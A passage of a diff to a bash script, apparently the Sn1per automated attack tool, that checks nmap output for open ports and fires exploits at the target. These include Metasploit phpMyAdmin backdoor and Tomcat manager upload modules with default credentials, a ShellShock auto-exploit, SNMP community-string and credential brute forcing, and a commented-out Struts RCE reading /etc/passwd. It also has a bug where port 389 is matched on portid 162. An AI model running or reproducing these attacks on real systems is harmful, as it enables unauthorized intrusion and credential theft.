-port_53=`grep 'portid="53"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_79=`grep 'portid="79"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_80=`grep 'portid="80"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_110=`grep 'portid="110"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_111=`grep 'portid="111"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_135=`grep 'portid="135"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_139=`grep 'portid="139"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_161=`grep 'portid="161"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_162=`grep 'portid="162"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_389=`grep 'portid="162"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_443=`grep 'portid="443"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_445=`grep 'portid="445"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_512=`grep 'portid="512"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_513=`grep 'portid="513"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_514=`grep 'portid="514"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_1099=`grep 'portid="1099"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_1524=`grep 'portid="1524"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_2049=`grep 'portid="2049"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_2121=`grep 'portid="2121"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_3128=`grep 'portid="3128"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_3310=`grep 'portid="3310"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_3632=`grep 'portid="3632"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_5800=`grep 'portid="5800"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_8009=`grep 'portid="8009"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_49152=`grep 'portid="49152"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
+port_21=`grep 'portid="21"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_22=`grep 'portid="22"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_23=`grep 'portid="23"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_25=`grep 'portid="25"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_53=`grep 'portid="53"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_79=`grep 'portid="79"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_110=`grep 'portid="110"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_111=`grep 'portid="111"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_135=`grep 'portid="135"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_139=`grep 'portid="139"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_161=`grep 'portid="161"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_162=`grep 'portid="162"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_389=`grep 'portid="162"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_445=`grep 'portid="445"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_512=`grep 'portid="512"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_513=`grep 'portid="513"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_514=`grep 'portid="514"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_1099=`grep 'portid="1099"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_1524=`grep 'portid="1524"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_2049=`grep 'portid="2049"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_2121=`grep 'portid="2121"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_3128=`grep 'portid="3128"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_3310=`grep 'portid="3310"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_3632=`grep 'portid="3632"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_5800=`grep 'portid="5800"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8009=`grep 'portid="8009"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_49152=`grep 'portid="49152"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 
 if [ -z "$port_21" ];
 then
@@ -576,7 +573,7 @@ else
 	python ssh-audit.py $TARGET:22
 	cd ..
 	nmap -A -sV -sC -T5 -p 22 --script=ssh-* $TARGET
-	msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$PWD"/BruteX/wordlists/simple-users.txt; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
+	msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
 fi
 
 if [ -z "$port_23" ];
@@ -614,7 +611,7 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 79 opened... running tests...$RESET"
 	nmap -A -sV -T5 --script=finger* -p 79 $TARGET
-	bin/fingertool.sh $TARGET BruteX/wordlists/simple-users.txt
+	bin/fingertool.sh $TARGET $USER_FILE
 fi
 
 if [ -z "$port_80" ];
@@ -680,8 +677,8 @@ else
 	echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
 	nikto -h http://$TARGET 
 	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
-	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port80.jpg"
-	cutycapt --url=http://$TARGET --out=loot/$TARGET-port80.jpg
+	echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port80.jpg"
+	cutycapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg
 	
 	if [ "$MODE" = "web" ];
 	then
@@ -707,7 +704,7 @@ else
 		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
-		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 80
+		python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 80
 	fi
 	
 	if [ $SCAN_TYPE == "DOMAIN" ];
@@ -715,7 +712,7 @@ else
 		echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=--------- -- +$RESET"
 		goohak $TARGET > /dev/null
 		echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=---------- -- +$RESET"
-		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt
+		php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
 		rm -Rf output/ cookie.txt exploits.conf
 		GHDB="1"
 	fi
@@ -767,7 +764,7 @@ then
 	echo -e "$OKRED + -- --=[Port 161 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 161 opened... running tests...$RESET"
-	for a in `cat BruteX/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
+	for a in `cat /usr/share/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
 	nmap -sU -p 161 --script=snmp* $TARGET
 fi
 
@@ -776,7 +773,7 @@ then
 	echo -e "$OKRED + -- --=[Port 162 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 162 opened... running tests...$RESET"
-	for a in `cat BruteX/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
+	for a in `cat /usr/share/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
 	nmap -A -p 162 --script=snmp* $TARGET
 fi
 
@@ -804,9 +801,9 @@ else
 	sslscan --no-failed $TARGET 
 	testssl $TARGET
 	echo ""
-	cd MassBleed
+	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 443
-	cd ..
+	cd $INSTALL_DIR
 	echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10
@@ -858,8 +855,8 @@ else
 	echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
 	nikto -h https://$TARGET 
 	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
-	cutycapt --url=https://$TARGET --out=loot/$TARGET-port443.jpg
-	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port443.jpg"
+	cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
+	echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port443.jpg"
 	
 	if [ "$MODE" = "web" ];
 	then
@@ -883,7 +880,7 @@ else
 		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
-		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 443 --ssl
+		python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 443 --ssl
 	fi
 	
 	if [ $SCAN_TYPE == "DOMAIN" ];
@@ -893,7 +890,7 @@ else
 			echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=---------- -- +$RESET"
 			goohak $TARGET > /dev/null
 			echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=----------- -- +$RESET"
-			php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt
+			php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
 			rm -Rf output/ cookie.txt exploits.conf
 		fi
 	fi
@@ -1062,9 +1059,7 @@ else
 	xsstracer $TARGET 8000
 	cd ..
 	nikto -h http://$TARGET:8000 
-	cutycapt --url=http://$TARGET:8000 --out=loot/$TARGET-port8000.jpg
-	python jexboss/jexboss.py -host http://$TARGET:8000
-
+	cutycapt --url=http://$TARGET:8000 --out=$LOOT_DIR/screenshots/$TARGET-port8000.jpg
 fi
 
 if [ -z "$port_8100" ];
@@ -1078,12 +1073,11 @@ else
 	echo ""
 	xsstracer $TARGET 8100
 	sslscan --no-failed $TARGET:8100
-	cd MassBleed
+	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 8100
-	cd ..
+	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8100 
-	cutycapt --url=http://$TARGET:8100 --out=loot/$TARGET-port8100.jpg
-	python jexboss/jexboss.py -host http://$TARGET:8100
+	cutycapt --url=http://$TARGET:8100 --out=$LOOT_DIR/screenshots/$TARGET-port8100.jpg
 fi
 
 if [ -z "$port_8080" ];
@@ -1097,18 +1091,15 @@ else
 	echo ""
 	xsstracer $TARGET 8080
 	sslscan --no-failed $TARGET:8080
-	cd MassBleed
+	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 8080
-	cd ..
+	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8080 
-	cutycapt --url=http://$TARGET:8080 --out=loot/$TARGET-port8080.jpg
+	cutycapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg
 	nmap -A -p 8080 -T5 --script=*proxy* $TARGET
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
-	python jexboss/jexboss.py -host http://$TARGET:8080
-	python jexboss/jexboss.py -host https://$TARGET:8080
-	
 fi
 
 if [ -z "$port_8180" ];
@@ -1123,16 +1114,15 @@ else
 	xsstracer $TARGET 8180
 	sslscan --no-failed $TARGET:8180
 	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8180
-	cd MassBleed
+	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 8180
-	cd ..
+	cd $INSTALL_DIR
 	nikto -h http://$TARGET:8180 
-	cutycapt --url=http://$TARGET:8180 --out=loot/$TARGET-port8180.jpg
+	cutycapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg
 	nmap -p 8180 -T5 --script=*proxy* $TARGET
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
-	python jexboss/jexboss.py -host http://$TARGET:8180
 fi
 
 if [ -z "$port_8443" ];
@@ -1147,13 +1137,12 @@ else
 	xsstracer $TARGET 8443
 	sslscan --no-failed $TARGET:8443
 	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8443
-	cd MassBleed
+	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 8443
-	cd ..
+	cd $INSTALL_DIR
 	nikto -h https://$TARGET:8443 
-	cutycapt --url=https://$TARGET:8443 --out=loot/$TARGET-port8443.jpg
+	cutycapt --url=https://$TARGET:8443 --out=$LOOT_DIR/screenshots/$TARGET-port8443.jpg
 	nmap -A -p 8443 -T5 --script=*proxy* $TARGET
-	python jexboss/jexboss.py -host https://$TARGET:8443	
 fi
 
 if [ -z "$port_8888" ];
@@ -1167,8 +1156,7 @@ else
 	echo ""
 	xsstracer $TARGET 8888
 	nikto -h http://$TARGET:8888 
-	cutycapt --url=https://$TARGET:8888 --out=loot/$TARGET-port8888.jpg
-	python jexboss/jexboss.py -host http://$TARGET:8888	
+	cutycapt --url=https://$TARGET:8888 --out=$LOOT_DIR/screenshots/$TARGET-port8888.jpg
 fi
 
 if [ -z "$port_10000" ];
@@ -1190,36 +1178,20 @@ else
 fi
 
 echo -e "$OKGREEN + -- ----------------------------=[Scanning For Common Vulnerabilities]=----- -- +$RESET"
-cd yasuo
+cd $PLUGINS_DIR/yasuo
 ruby yasuo.rb -r $TARGET -b all
-cd ..
+cd $SNIPER_DIR
 
 if [ "$AUTOBRUTE" = "0" ]; then
 	echo -e "$OKGREEN + -- ----------------------------=[Skipping Brute Force]=-------------------- -- +$RESET"
 else
 	echo -e "$OKGREEN + -- ----------------------------=[Running Brute Force]=--------------------- -- +$RESET"
-	cd /usr/share/sniper/BruteX
-	./brutex $TARGET
+	brutex $TARGET
+	cd $INSTALL_DIR
 	rm -f hydra.restore
-	mv loot/* ../loot/
-	cd ..
-	echo ""
 	rm -f scan.log
+	echo ""
 fi
-cd $PWD/loot/
-echo -e "$OKORANGE + -- --=[Sorting loot directory ($PWD)"
-mkdir reports/ -p 2> /dev/null
-echo -e "$OKORANGE + -- --=[Generating reports..."
-for a in `ls sniper-*.txt 2>/dev/null`; do echo "$a" >> reports/$a && sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a > reports/$a; done
-mv $PWD/report-* $PWD/reports/ 2> /dev/null
-mkdir $PWD/screenshots/ -p 2> /dev/null
-mv $PWD/*.jpg $PWD/screenshots/ 2> /dev/null
-mkdir $PWD/nmap -p 2> /dev/null
-mv $PWD/*.xml $PWD/nmap/ 2> /dev/null
-mkdir $PWD/domains -p 2> /dev/null
-mv $PWD/domains-* $PWD/domains/ 2> /dev/null
-mkdir $PWD/output -p 2> /dev/null
-mv $PWD/sniper-* $PWD/output 2> /dev/null
-rm -f $PWD/.fuse_* 2> /dev/null
+loot
 echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
 exit 0
